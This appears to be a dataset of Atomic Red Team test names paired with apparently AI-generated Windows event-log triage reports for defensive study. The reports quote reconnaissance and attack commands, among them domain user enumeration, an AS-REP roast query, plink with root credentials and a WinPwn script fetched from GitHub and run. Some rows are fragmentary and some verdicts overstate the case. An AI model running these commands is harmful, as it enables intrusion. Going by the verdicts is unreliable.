   - **Logon Type 3:** This indicates a network logon, which can be legitimate but combined with other activity (e.g., clearing logs) might be suspicious.

3. **Use of Command-Line Utilities (Sysmon Logs):**
   - Numerous instances of `wevtutil.exe` were invoked (EventID 1 from Sysmon), which confirms the clearing of logs across different channels: Security, System, Application, and Windows PowerShell.
   - The presence of `cmd.exe` executing what appears to be enumeration commands (e.g., `wevtutil enum-logs`) could suggest the attacker was trying to gather information.

4. **EventID 4616 (System Time Change):**
   - An unusual system time change was observed (backwards adjustment by a few milliseconds). While this alone isn't definitive of malicious activity, tampering with system time can be associated with attempts to disrupt logging sequences or tamper with time-based security mechanisms.

5. **IP Address and Workstation:**
   - The logon with IP `fe80::e3b5:5371:12a8:9c77` indicates a remote action, potentially tracing to an IPv6 address bearing scrutiny if unfamiliar.

6. **General System Behavior:**
   - **Clearing Windows PowerShell Logs:** Indicates efforts to remove traces of commands that might have been run via PowerShell.
   - **`whoami.exe` and `hostname.exe` Use:** These are typically benign utilities but could also be used by an attacker to ascertain user context or machine configuration.

### Assessment:

- The logs indicate **SUSPICIOUS** activity. The clearing of logs, the presence of elevated privileges, and the enumeration/log tampering behaviors strongly suggest that further investigation is warranted. These activities could potentially signal a compromise, particularly due to the combination of privilege escalation and log clearance.

### Recommendations:

1. **Immediate Actions:**
   - Verify the identity and action history of the user `admin_test`.
   - Review network logs and remote IP access, especially those related to IPv6 addresses for additional suspicious activity.

2. **Enhanced Monitoring:**
   - Increase monitoring of high-privilege accounts and all uses of `wevtutil`, `cmd.exe`, or PowerShell.
   - Implement alerting for future occurrences of EventID 1102 (log clearance) and 4672 (privilege assignments).

3. **Investigation:**
   - Conduct a forensic analysis on `Server002` to check for unauthorized changes, foreign tools, or any signs of backdoors.
   - Check other systems in the network for similar patterns to prevent lateral movement.

Concluding, while there are no definitive signs to 100% confirm malicious activity in isolation, the aggregate of these observations warrants categorizing the situation as suspicious and necessitates further and thorough exploration."
Enumerate domain computers within Active Directory using DirectorySearcher,"Upon reviewing the provided Windows event logs, several key observations and potential indicators of suspicious or malicious activity were noted:

1. **Log File Clearing Activities:**
   - System Event 104 and Security Event 1102 both indicate that logs were cleared by a user with the username ""admin_test"" on `Server002`. The clearing of event logs can be indicative of an attempt to remove traces of suspicious or malicious activities.

2. **Usage of PowerShell:**
   - There are several PowerShell log events indicating the execution of potentially suspicious scripts. For example, in the PowerShell logs, a script is being executed, searching for directory information. While PowerShell usage is common for legitimate administration tasks, its use in conjunction with cleared logs could suggest attempted data exfiltration or reconnaissance.

3. **Sysmon Event Activity:**
   - There are several Sysmon events documenting the execution of `wevtutil.exe` with command lines suggesting the clearing of event logs (cl command used for clearing logs) such as Sysmon Event IDs 1, with a `CommandLine` entry of ""wevtutil.exe cl Microsoft-Windows-Sysmon/Operational"". This aligns with the log clearing activities mentioned above.
   - Frequent launching of processes like `wevtutil.exe`, `conhost.exe`, `powershell.exe`, and other system utilities under a high integrity level by the user ""admin_test"" suggest a high level of privilege and potential misuse.

4. **Unusual Credential Activity:**
   - There were several Event ID 5379 entries in the security log involving credential operations with return codes suggesting failures (ReturnCode 3221226021). This might indicate failed or repeated attempts to access sensitive resources, which could relate to unauthorized attempts to elevate permissions or access network resources.

5. **Network Services and Application Updates:**
   - Legitimate updates and activities from `Windows Update` and `Microsoft Edge Update` services are observed, indicating regular system maintenance. However, these are overshadowed by the suspicious activities.

**Assessment and Recommended Resolution:**

- The combination of cleared event logs, frequent PowerShell usage, and Sysmon process executions such as `wevtutil.exe` indicates a pattern consistent with malicious activity. The event clearing, in particular, suggests an attempt to hinder detection and investigation.

**Final Resolution: MALICIOUS**

Given the evidence, it's highly recommended to conduct an immediate and thorough investigation into the actions of the user ""admin_test"" and inspect all related activities. It is critical to enhance monitoring on `Server002`, review all user permissions, and conduct user activity reviews, particularly for administrative users who might have logged such activities. Additionally, auditing and restricting the use of powerful scripting and logging tools should be considered to prevent their misuse."
Suspicious LAPS Attributes Query with Get-ADComputer all properties and SearchScope,"### Analysis of Logs

The logs provided span multiple Sysmon events, Application events, Windows PowerShell activity, and Security and System logs. Below is the analysis based on the event logs provided:

#### Sysmon Log Analysis

- **Event ID 1 & 5 Activities**:
   - We see multiple instances of `wevtutil.exe` being used to clear event logs (specifically using `cl` command with logs like `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell`). This activity suggests an attempt to cover tracks, which is highly suspicious.
   - Several `conhost.exe` instances are spawned as child processes of `wevtutil.exe` indicating typical parent-child process behavior but are not inherently suspicious by themselves.

#### Windows PowerShell Log Analysis

- PowerShell logs show activity with the `HostApplication` using a command-line for retrieving Active Directory computer details: `powershell.exe & {Get-adcomputer -SearchScope subtree -filter \""name -like '*'\"" -Properties *}`. This could be normal administrative activity but in the context of logs being cleared, it could have been used maliciously.

#### Security Log Analysis

- **Event ID 1102** indicates that the Security audit log was cleared, which is a classic indication of malicious activity trying to cover tracks.
- **Event ID 4616** notices time changes which could indicate an attempt to manipulate timestamps to further obfuscate activities.

#### System Log Analysis

- **Event ID 104** records that the System and Windows PowerShell log files were cleared by `admin_test`.

### Conclusion

The combination of log clearance activities involving critical logs (`Security`, `System`, and `Windows PowerShell`) and PowerShell commands indicates a high probability of malicious intent. The attempt to clear these logs after performing potentially sensitive operations like probing Active Directory machines suggests a cover-up of a significant breach or misuse.

### Resolution

These steps should help in both containing the current malicious activity and preventing similar occurrences in the future."
Enumerate all accounts (Domain),"Upon analysis of the provided Windows event logs, several indicators suggest that the observed activity may be SUSPICIOUS and warrant further investigation. Here’s the breakdown:

### Suspicious Activities & Indicators:

1. **Event Clearing:**
   - The security log indicates an event ID 1102, which denotes the clearing of the security log. This action was performed by the user `admin_test` at SystemTime `2024-10-23 20:46:55.5475173`. 
   - Similarly, the system and Windows PowerShell logs were cleared as indicated by event ID 104 at corresponding times.
   - Clearing logs is a common tactic used by attackers to cover their tracks and should be considered suspicious, especially if not performed by an authorized individual or scheduled maintenance.

2. **Use of `wevtutil` Tool:**
   - The `wevtutil` tool, which is typically used for managing Windows event logs, was executed multiple times shortly before the logs were cleared. This includes clearing channels like Microsoft-Windows-Sysmon, Application, and Security, aligning with the log clearance events.
   - The use of `wevtutil` in conjunction with log clearance strengthens the suspicion of an intentional effort to hide activities.

3. **Anomalous Use of System Utilities:**
   - There were Sysmon Event ID 1 logs for `whoami.exe`, `hostname.exe`, and command-line processes executing network commands (`net user /domain` and `net group /domain`). These commands could be used for reconnaissance purposes, suggesting the user might be gathering information about the system and domain.
   - The command-line tools were executed from a high integrity context which permits actions that could affect system settings and security.

4. **Activities by `admin_test`:**
   - The user `admin_test` seems to be the primary actor across several suspicious actions including log clearing and system reconnaissance commands.
   - The integrity level marked as “High” in several instances indicates processes were run with elevated privileges, potentially allowing modification of critical system components.

### Assessment & Recommendations:

- **Resolution: SUSPICIOUS**: The combination of clearing event logs, utilizing `wevtutil`, and executing reconnaissance commands by a user with administrative access is suspicious in nature. While we can't definitively label these activities as malicious without further context (such as correlating network traffic or insider knowledge), they merit a detailed investigation to rule out malicious intents.

### Suggested Actions:

1. **Conduct a Thorough Investigation**: 
   - Verify if the `admin_test` user indeed performed these activities within their legitimate role. Look into additional logs, if available, to trace any related network activities or unauthorized logins, even from external monitoring tools.
   - Check if there are any scheduled tasks, scripts, or maintenance windows that might explain these actions legitimately.

2. **Audit Permissions**: 
   - Review the permissions and access granted to the `admin_test` account to ensure they are necessary and in line with the user's role.

3. **Implement Monitoring**: 
   - Set up more robust log monitoring and alerting on crucial security events, like event log clearance and execution of specific tools or commands, particularly those that are indicative of potential reconnaissance or cleanup steps in the MITRE ATT&CK framework.

4. **Educate on Security Best Practices**: 
   - If this activity was determined to be benign yet risky in nature, it would be beneficial to conduct a training session on proper log management and review protocols for privileged users.

Pursuing these steps will help clarify the intent behind these logs and ensure that any potential malicious activity is promptly identified and mitigated."
WinPwn - fruit,"Upon analyzing the provided Windows event logs, several indicators point to potentially malicious activity. Here's a detailed breakdown:

System Owner-User Discovery Using Command Prompt,"Upon analyzing the provided Windows event logs, certain events suggest potential suspicious activity that warrants further investigation, while others appear more routine in nature. Here’s a detailed breakdown:

### Suspicious Activity Observed:
1. **Event Log Clearing:**
   - Logs show `wevtutil.exe` was used multiple times to clear logs (`cl` command), specifically targeting the `System`, `Security`, and `Windows PowerShell` channels, all conducted by the user `admin_test`. Event log clearing might be a tactic used by attackers to cover tracks after performing malicious activities.

2. **Unusual Command Execution:**
   - The execution of `cmd.exe` with a command line involving dumping user information and listing user accounts to a temporary file looks suspicious. The command executed is:
     ```
     cmd.exe /c set file=$env:temp\\user_info_%%random%%.tmp & echo Username: %%USERNAME%% > %%file%% & echo User Domain: %%USERDOMAIN%% >> %%file%% & net users >> %%file%% & query user >> %%file%%
     ```
   This command captures user-related information which might be useful for further attack vectors or privilege escalation attempts.

### Routine Activity Observed:
1. **Windows Updates:**
   - Multiple instances of `wuauclt.exe`, `AM_Delta.exe`, and `MpSigStub.exe` are typical processes seen during routine Windows updates, particularly related to Microsoft Defender Antivirus updates.

2. **Administrator Activity:**
   - The events executed by `admin_test` might represent administrative actions, especially if this user regularly performs system maintenance tasks.

### Assessment:
While the act of clearing event logs by an admin user can sometimes be legitimate, it’s often a red flag when coupled with other suspicious activities like the probing commands seen via `cmd.exe`. The nature and timing of these actions suggest they could be part of an exploratory or potentially harmful activity.

### Resolution:
Based on the evidence provided:

- **Resolution:** **SUSPICIOUS**

It is crucial not to overlook these findings and to continue a thorough investigation to rule out any possible security compromises."
List Open Egress Ports,"After conducting a detailed analysis of the provided logs, here are the observations:

1. **PowerShell Activities**:
   - The PowerShell logs show that a script is reading from a file located at `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1016\src\top-128.txt` and is attempting to connect to the domain `allports.exposed` on various ports. This behavior is consistent with network scanning for open ports.
   - The usage of `AtomicRedTeam` suggests the use of a known security testing tool. While Atomic Red Team is used for legitimate security testing, its presence without context could indicate a potential insider threat or unauthorized security testing.

2. **Event Log Clearing**:
   - The system logs reveal that the event logs (System, Windows PowerShell) were cleared by a user named `admin_test`. This is noted in event IDs 104 related to event log clearance.
   - The security log is also cleared, as indicated by event ID 1102. Clearing of logs is often associated with attempts to hide malicious activity, especially when followed by no corresponding legitimate explanation or established maintenance practice.

3. **Sysmon and System Activities**:
   - There are multiple instances of `wevtutil.exe` being executed to clear logs (`System`, `Security`, and `Windows PowerShell`). This activity further supports the suspicion of an attempt to cover tracks.
   - Processes like `wevtutil.exe`, `conhost.exe`, and `powershell.exe` are executed by `SERVER002\admin_test`. `wevtutil.exe` is used here for log clearing alongside elevated integrity (High).

4. **Search and Host Activity**:
   - The logs display routine processes such as `SearchProtocolHost.exe` and `svchost.exe` under the SYSTEM authority. These activities do not inherently suggest malicious behavior and align with typical Windows operations.

5. **User Context and Privilege**:
   - The operations are executed by the user `admin_test` which holds a high integrity level. The activities involve using powerful utilities like PowerShell and `wevtutil.exe` for potentially unauthorized reconnaissance and log manipulation.

### Assessment:
The combination of PowerShell network scanning activities, clearing of multiple system logs by a non-standard user (`admin_test`), and use of `wevtutil.exe` suggest signs of malicious activity possibly aimed at reconnaissance followed by cover-up actions. The usage of Atomic Red Team adds a layer of complexity, as it may point to either a red team exercise, unauthorized security testing, or an insider threat scenario.

### Resolution:
- **MALICIOUS**: The logs exhibit behavior associated with reconnaissance and deliberate action to hide activity through log clearing, indicating a potential threat to the host system.

### Guidance:
- **Immediate Actions**:
  - Verify with the system's administration team whether this activity was sanctioned and part of a legitimate security exercise.
  - If unauthorized, isolate the host to prevent further potential spread of malicious activity.
  - Review the account `admin_test` for unauthorized access tactics or compromised credentials.
  - Restore cleared logs if backups are available, to understand the complete extent of potential malicious activity.

- **Preventive Measures**:
  - Tighten monitoring and alerting around key utilities and administrative actions.
  - Enforce strict access controls and audit trails for user accounts with elevated privileges.
  - Educate users regarding the misuse of legitimate tools for malicious purposes.

In conclusion, further investigation and remediation steps should be taken to address this suspicious activity and mitigate potential security risks."

#### Indicators of Malicious Activity:

1. **Log Clearing Activities**:
   - Sysmon events indicate the use of `wevtutil.exe` to clear specific event logs, including the Security, System, and Windows PowerShell logs.
   - Notable events:
     - EventID 5 at `18:46:06.292 and 18:46:06.421` from `wevtutil.exe` with the command-line `cl` option, suggesting log clearing activity.
     - Security EventID 1102 indicates that logs were cleared by `admin_test` at `18:46:06.349`.

2. **Suspicious Command Line and Use of Known Dual-use Tools**:
   - EventID 17994 showcases the command-line use of `cmd.exe` to run `plink.exe`, a command-line network tool, which is used to connect to 'atomic.local' using SSH as 'root' with a password (`-pw ""pass""`). This suggests unauthorized and potentially harmful activity.
   - The presence of `AtomicRedTeam` and `ExternalPayloads` in the process path, specifically targeting `esx_darkside_discovery.txt`, indicates red team operations or similar activities aligned with penetration testing or malicious reconnaissance.

3. **Privilege Escalation Attempts**:
   - Multiple events where `wevtutil.exe` is executed have high integrity level, indicating attempts to clear logs as a user with elevated privileges.
   - Security EventID 4672 displays the allocation of high privileges to SYSTEM processes which might correlate with unauthorized access or privileges.

4. **Anomalous Process Execution**:
   - Multiple temporary processes related to Microsoft Edge Update operations are noted, which could suggest attempts to blend malicious activities in common update operations. However, this alone might not constitute immediate concern without correlating suspicious behavior.

#### Assessment:

The logs reflect indicators of potential malicious activity:

- **Malicious**: The use of `wevtutil.exe` to clear important system logs is a definitive indicator of malicious intent, frequently used by attackers to cover up their traces after a system compromise.
- **Suspicious**: The execution of `plink.exe` with root access credentials further corroborates unauthorized remote connections or attempts to exfiltrate information.
  
Based on the logs:
- **Resolution**: MALICIOUS

By addressing the security gaps identified, further malicious activity can be mitigated and future occurrences potentially prevented."
PowerShell Network Sniffing,"Analyzing the provided logs reveals multiple noteworthy activities that may suggest suspicious behavior:

1. **Event Log Clearing**: The logs show numerous instances of the ""wevtutil.exe"" process being executed to clear logs (`CommandLine: ""C:\\Windows\\system32\\wevtutil.exe"" cl <LogType>`). Log file clearing actions are logged multiple times across different logs (e.g., Application, Security, and System logs), as seen in Event IDs 1102, 104, etc. Frequent and simultaneous log clearing, especially without a legitimate reason, often indicates an attempt to hide malicious activity.

2. **Execution of PowerShell Script**: There is evidence of a PowerShell script executing network capture commands, which include creating a new network event session and capturing packets (`CommandLine: ""powershell.exe"" & {New-NetEventSession -Name Capture007 ...}`). This activity might be indicative of attempts to perform network surveillance or exfiltration, potentially pointing towards malicious behavior.

3. **Time Manipulation Events**: The Security and System logs show back-to-back adjustments to the system time (Event ID 4616), with changes to the system clock. Time manipulation can be used to ensure logs match certain activities or to confuse logging by making events appear as if they happened at a different time.

4. **High Privilege and Integrity Processes**: The logs record multiple events showing the execution of processes with high integrity levels and elevated privileges such as ""SeDebugPrivilege"" which is usually restricted to administrators (Event ID 4672). The use of these privileges without a legitimate administrative task can indicate an attempt to gain unauthorized control over the system.

5. **Clearing of Security Log by a Non-standard User**: The security event (Event ID 1102) logs the clearing of the security logs by ""admin_test,"" a user that may not typically have this requirement, adding another layer of concern.

Based on these observations:

- The clearing of logs, especially for Security, System, and Application logs, alongside unauthorized scripting for network capture using PowerShell commands, and time manipulation, are serious indicators of an attempt to cover tracks and potentially malicious activities.
  
- Though the analysis does not confirm the exact intentions or outcomes, the actions themselves align with known malicious behaviors, particularly involving log tampering and network surveillance.

**Resolution**: MALICIOUS

**Recommendation**:
1. Investigate the user ""admin_test"" for any unauthorized access or misuse.
2. Conduct forensic analysis on any affected systems to detect further signs of compromise.
3. Block or quarantine associated processes and inspect network and system integrity.
4. Review and potentially change logging and monitoring policies to prevent such activities from going unnoticed in the future. 
5. Consider resetting credentials for affected accounts and conducting an organization-wide awareness to prevent future incidents."
Find and Display Internet Explorer Browser Version,"Upon reviewing the provided Windows event logs, several points of interest and potential areas of concern emerge, particularly around the use of `wevtutil.exe`, process execution patterns, and logs being cleared.

### Analysis:

1. **Frequent Usage of `wevtutil.exe`:**
   - The `wevtutil.exe` command is executed multiple times with the ""cl"" (clear) argument, targeting various channels such as ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", ""Security"", and ""Windows PowerShell"".
   - Example:
     - `C:\Windows\system32\wevtutil.exe cl Security` – This indicates the clearing of the Security event logs.

2. **Concurrent Execution of System Commands:**
   - Command line utilities such as `whoami.exe`, `hostname.exe`, and `cmd.exe` were executed. `cmd.exe` was used to run registry queries:
     - `cmd.exe` was used with `/c reg query ""HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer"" /v svcVersion`, which might indicate an attempt to gather system information.
   - These activities, in conjunction with the `wevtutil.exe` log-clearing commands, suggest potential reconnaissance or evasion attempts.

3. **Event ID 1102 - Security Log Cleared:**
   - The security log contains an `Event ID 1102`, indicating that event logs were cleared, which is often considered suspicious as it could be an attempt to cover malicious activities.
   - Logged under user `admin_test`, it coincides with the execution context of `wevtutil.exe`.

4. **Time Manipulation Suspicion:**
   - There are several time change logs (Event ID 4616) captured in the Security log. These typically reflect changes to the system time, often indicative of time manipulation attempts, though in this context, it aligns with log clearances.

### Assessment:

Considering the outlined activities, these logs reflect patterns commonly associated with attempts at evasion and post-exploitation activities within a system. The administrative context in which these commands were executed (under the admin_test account), coupled with the clearing of critical logs, strongly suggests potentially malicious intent.

### Resolution:

- **Resolution:** MALICIOUS
  - **Rationale:** The combination of multiple event log clearances with `wevtutil.exe`, usage of various command line utilities, and associated system time changes strongly indicates malicious activity aiming to cover tracks and perform reconnaissance.

### Guidance:

1. **Immediate Actions:**
   - Isolate the affected host (Server002) from the network to prevent further potential malicious activities.
   - Conduct a full malware scan and memory analysis on Server002 to identify any additional indicators of compromise.
   - Review other systems for similar patterns of behavior to determine if other hosts may be affected.

   - Educate users on secure practices for account usage, particularly for administrative accounts. 

Taking these steps can help uncover the extent of the compromise and mitigate the associated risks."
System Time with Windows time Command,"Upon reviewing the logs provided, several indicators suggest potential malicious activity on the Windows host. Here is a detailed analysis:

1. **Clearing Event Logs**:
   - The security log entry with EventID 1102 indicates the log file was cleared by user `admin_test`. This action is typically performed to remove traces of activity, which is highly suspicious, especially if not documented as part of routine maintenance. Associated processes include `wevtutil.exe` (Events: Security - 30350, Sysmon - 17953, 17961, 17957), which is a command-line utility for obtaining information about event logs and publishers.

2. **High Privilege Access**:
   - EventID 4672 indicates that `admin_test` was assigned special privileges, including `SeSecurityPrivilege`, `SeTakeOwnershipPrivilege`, `SeDebugPrivilege`, and others. These are high-level privileges that could be used for unauthorized access or privilege escalation.

3. **Unusual Time Change**:
   - EventID 4616 shows a time change initiated by the `LOCAL SERVICE` account. While time synchronization is normal, if coupled with other anomalies, it could indicate an attempt to reset event times after unauthorized activity.

4. **Process Executions**:
   - Multiple executions of `wevtutil.exe` for clearing logs – EventID 1 in Sysmon indicates these executions were performed by `admin_test`.
   - Execution of `cmd.exe` with parameters to change the system time (`cmd.exe /c time`) is linked to process tampering indications.

5. **Unidentified Command Line Activity**:
   - Execution of applications associated with Microsoft Edge updates (`MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateComRegisterShell64.exe`), seen throughout Sysmon logs, appears legitimate. However, the context in which they occur warrants a detailed review to ensure authenticity.

The combination of log clearing, high privilege access, and command-line activity involving system utilities suggests potential malicious intent. While some activities by Microsoft processes appear routine, they may be exploited or coincidental distractions from the primary malicious objective.

**Resolution: MALICIOUS** – Based on the actions observed:
- Immediate inspection of the `admin_test` user account and associated IP addresses for any unauthorized changes or accesses.
- Conduct thorough forensic analysis of memory and storage to identify hidden or deleted malware traces.
- Verify system and application binaries for any unauthorized modifications.
- Ensure event logs are regularly backed up and review logs for similar patterns in activity.

This incident should be escalated for a full incident response investigation."
Network Share Discovery via dir command,"Based on the provided logs, several activities stand out as suspicious and potentially indicative of malicious behavior:

1. **Event Log Clearing:** The System, Windows PowerShell, and Security logs have entries indicating that event logs were cleared by the user ""admin_test"" (Event IDs 104 and 1102). This is often performed by attackers to cover tracks after unauthorized activities.

2. **Usage of `wevtutil.exe`:** This utility was used multiple times to clear specific event logs such as Sysmon and Application logs. The command `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`, among others, suggests an intentional log-clearing activity, a known tactic to hide malicious actions.

3. **Command Execution via `cmd.exe`:** Execution of the command `\""cmd.exe\"" /c dir \\\\127.0.0.1\\c$ & dir \\\\127.0.0.1\\admin$ & dir \\\\127.0.0.1\\IPC$` is an unusual activity, especially when run from a high integrity level account (admin_test) that can indicate reconnaissance activities, such as verifying share access or preparing for lateral movement within a network.

4. **Integrity Level and Execution Environment:** Many processes are executed with a high or system integrity level by the user ""SERVER002\\admin_test"", which is consistent with elevated privileges or potential privilege escalation.

5. **Background System Processes:** Frequent and rapid execution of various system processes like `whoami.exe` and `hostname.exe` in such a short period without an evident operational need could highlight attempts to gather system information as part of a reconnaissance phase.

6. **Repeated Edge Update Processes:** While the presence of Microsoft Edge Update processes is typical on a Windows machine, the volume and variety of Edge installations and updates in a very short time span (such as logs indicating EdgeSetup) could suggest either abnormal software deployment activities or be part of obfuscating other actions.

Given these observations, the conclusion from the log analysis is:
- **Resolution: MALICIOUS**

### Guidance:
1. **Immediate Response:** Initiate incident response procedures. Inform the IT security team about this potential breach.
2. **Containment:** Secure the affected host (Server002) by isolating it from the network to prevent further action or spread.
3. **Investigation & Analysis:** Conduct a detailed forensic investigation to determine the origin of the unauthorized access, how privileges were escalated, and if any other systems are impacted.
4. **Log & Monitoring:** Re-enable and increase the logging level on cleared event logs and monitor for any other suspicious activities.
5. **Patch & Protect:** Ensure all software, particularly security-related, is up to date and review access controls around key logs and administrative accounts. Consider implementing additional security controls such as multi-factor authentication where possible.
6. **User Education:** Educate users about secure practices, particularly around the handling of admin accounts and credentials."

     - Two log entries indicate that logs were cleared from the System and Windows PowerShell channels by a user named 'admin_test'. Clearing logs can be a tactic used by adversaries to cover their tracks.

2. **Application Log:**
   - No immediately suspicious entries. Regular operations of Windows Defender and Edge updates are observed.

3. **Windows PowerShell Log:**
   - **EventID 600** series:
     - The PowerShell logs show the execution of a script from `""https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1""` which is associated with WinPwn, a recognized red teaming toolset. The command suggests the retrieval and execution of a script designed for offensive security testing, a hallmark of potentially malicious activity, especially if not authorized or expected in regular operations.

4. **Sysmon Log:**
   - Multiple entries show the execution of processes such as `whoami.exe`, `wevtutil.exe`, and PowerShell, primarily by the 'admin_test' account. 
   - **wevtutil.exe**:
     - Repeated clearing of Event Logs (`System`, `Application`, and `Security`) using `wevtutil` suggests an attempt to erase records of activity, which is a direct indicator of anomaly or unauthorized actions.

5. **Security Log:**
   - **EventID 1102**:
     - Confirms that the Security log was cleared by the same user 'admin_test', which is consistent with other log-clearing observations.

### Assessment and Resolution:

- The combination of logs being cleared, unauthorized PowerShell script execution from a suspicious URL (potential red team tool), and manipulation of Windows logs (clearing and querying) are strong indicators of malicious activity.
- The use of administrative credentials and system directories for potentially unauthorized PowerShell scripts further increases the risk factor.

### Threats and Risks Identified:
- **Privilege Escalation & Evasion**: Log clearing activities can hide privilege escalation attempts or other unauthorized actions.
- **Potential Compromise**: The use of an offensive security tool like WinPwn without proper authorization or context (e.g., an approved penetration test) is highly questionable.

Enumerate Users Not Requiring Pre Auth (ASRepRoast),"The logs provided indicate a sequence of events that need careful attention due to potential signs of malicious activity. Below is a detailed analysis of the logs:

1. **Repeated Usage of `wevtutil.exe`**: The Sysmon logs show multiple executions of `wevtutil.exe` for clearing logs across different channels – specifically Microsoft-Windows-Sysmon, Application, System, and Windows PowerShell logs (`e.g., wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`). This behavior is suspicious because it suggests an attempt to cover tracks by clearing event logs. Legitimate administrators typically do not clear logs unless there is a specific procedural reason to do so.

2. **Execution of Suspicious PowerShell Command**: There is a PowerShell execution with the command `get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}`. This command searches for Active Directory users with an attribute that might indicate a security misconfiguration that could be exploited. This is unusual and warrants investigation for potential nefarious intent.

3. **Clearing of Security Logs**: The Security log (`EventID: 1102`) shows that the Security log itself has been cleared. This is a strong indication of an attempt to hide potentially malicious activity. The username associated with this action is `admin_test`, which coincides with the user observed executing suspicious processes in the Sysmon logs.

4. **Clearing of System Logs**: Similarly, the System log entries (`EventID: 104`) indicate that logs from the System and Windows PowerShell channels have been cleared by the same user (`admin_test`).

5. **Execution of Sysinternals tools**: While common administrative processes like `conhost.exe` are observed, they follow or precede the use of log clearing utilities, which adds to the context of potentially suspicious activity.

**Assessment**:
- The recurring pattern of log clearance actions with `wevtutil.exe`, especially combined with PowerShell commands that can be indicative of reconnaissance or identifying security weaknesses, suggests an attempt to hide potentially unauthorized or malicious actions.
- The user account `SERVER002\\admin_test` is central to these activities, utilizing elevated privileges.

**Resolution**: 
- **MALICIOUS**: The findings strongly indicate malicious activity considering the systematic clearing of multiple event logs, the execution of a potentially harmful PowerShell command, and the general nature of the activity that suggests log tampering to cover tracks.

**Guidance on How to Proceed**:
- Isolate the affected system (`Server002`) from the network immediately to prevent potential lateral movement or further data exfiltration.
- Conduct a comprehensive forensic analysis to understand the scope and impact of the breach.
- Assess and audit any changes to critical systems, user accounts, and credentials.
- Change passwords for affected and potentially compromised accounts.
- Review and enhance security auditing and monitoring measures to prevent similar incidents in the future.

     - Event ID `104` in the System log - Indicates that logs have been cleared by the user `admin_test`.
     - Event ID `1102` in the Security log - Indicates the Security log was cleared by the same user.

3. **Execution of Command-Line Tools:**
   - The `cmd.exe` process was initiated with the command `""cmd.exe"" /c dir /s /b %%USERPROFILE%%\Favorites`, which could be an attempt to enumerate files in the user’s profile directory. While not inherently malicious, this action can be part of reconnaissance or data exfiltration processes in certain contexts.

4. **Privilege and User Context:**
   - Most activities including the log clearance were performed by the user `SERVER002\admin_test`, utilizing a high integrity level, which includes administrative privileges. 

5. **Potential Indicators of Compromise:**
   - The combination of log clearing and the execution of reconnaissance commands in sequence raises the need for further investigation. Such events could indicate attempts to cover tracks following unauthorized actions, or to perform malicious activities while remaining undetected.

### Assessment
- Multiple logs have been cleared immediately after suspicious command executions and this activity was carried out by an account (`admin_test`) with administrative privileges.
- The sequence and nature of these events, including the clearing of different event logs, suggest potential malicious intent or an attempt to cover tracks after activities that might be part of a cyber intrusion or compromise activity.

### Resolution: SUSPICIOUS
- The activities logged require further investigation to confirm whether they were authorized and necessary system maintenance or if they are indeed indicators of compromise.
- Recommended actions include verifying the legitimacy of the `admin_test` account actions, checking for any anomalies in executed commands and other activities, and ensuring all security patches and antivirus signatures are up to date.

In conclusion, the current assessment categorizes the findings as SUSPICIOUS, necessitating further scrutiny to either validate legitimate use or uncover potentially hidden malicious actions."
TruffleSnout - Listing AD Infrastructure,"After carefully reviewing the provided Windows event logs, several elements suggest suspicious activity that warrants further investigation:

1. **Log File Clearing (Security Event 1102 and System Event 104):**
   - The logs indicate that log files were cleared for the Security, System, and Windows PowerShell channels. This action was performed by the user ""admin_test."" Clearing logs is a common tactic used by attackers to cover their tracks after compromising a system. 

2. **Usage of `wevtutil.exe`:**
   - The `wevtutil.exe` utility was used several times by the same user ""admin_test"" with the command `wevtutil.exe cl <LogName>` to clear event logs, including Security, System, and Application logs. This is highly suspicious behavior, especially in conjunction with actual log clearing events, as it suggests intentional log clearing by a possibly malicious actor.

3. **Execution of Potentially Malicious Executable:**
   - The command-line execution of ""TruffleSnout.exe"" from a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\TruffleSnout.exe`) is noted. The path and naming convention reflect potential use of penetration testing tools often linked to emulation or offensive security practices, potentially indicating misuse or unauthorized use.

4. **High Integrity Level for Suspicious Processes:**
   - The various suspicious processes, such as `wevtutil.exe` and `whoami.exe`, were executed with a high integrity level, indicating elevated privileges were used, which could be associated with privilege escalation techniques.

Based on the above analysis, the activity documented in the logs suggests potential malicious actions. The deliberate clearing of logs, use of administrative tools to obfuscate activity, and execution of suspicious binaries are strong indicators of compromise.

**Resolution:** **MALICIOUS**

**Guidance on How to Proceed:**
- Isolate the impacted host (Server002) from the network to prevent further potential spread or data exfiltration.
- Conduct a detailed forensic analysis to understand the full scope of the compromise, including how the user account ""admin_test"" was used and potentially compromised.

Query Registry with Powershell cmdlets,"Upon analysis of the provided Windows event logs, the following points of interest and concerns were identified:

### Analysis:

1. **PowerShell Activity:**
   - The PowerShell logs indicate a sequence of command lines accessing multiple registry paths and configuration items. The execution of these commands suggests an attempt to gather information about system and user startup entries.
   - Commands that access registry paths associated with startup programs, such as `RunOnce`, `RunServices`, and `Winlogon`, may be used for persistence mechanisms or reconnaissance activities. This type of behavior can potentially be indicative of post-exploitation activities where an attacker seeks to understand or manipulate startup processes.

2. **Clearing of Event Logs:**
   - The system, application, security, and PowerShell event logs have been cleared around the same time frame. Specifically, logs were cleared by the `admin_test` user.
   - The clearing of logs, especially the security log, is highly suspicious. It often suggests an attempt to cover tracks after unauthorized or malicious activity.

3. **Sysmon Events:**
   - Sysmon logs indicate various command line executions, particularly concerning `wevtutil.exe`, suggesting that these commands might be part of the log-clearing process.
   - The presence of `whoami.exe` and `hostname.exe` being executed can sometimes be a benign activity. However, in conjunction with other findings, they might be indicative of reconnaissance efforts.
   - Processes such as `wuauclt.exe` and `MpSigStub.exe` related to updates and malware protection updates appear consistent with legitimate system and security operations.

4. **Windows Updates:**
   - Security updates for Microsoft Defender Antivirus were recorded. While this is normal, the timing coinciding with the log clearing might be used to mimic legitimate activity during or after the incident.

### Conclusion:

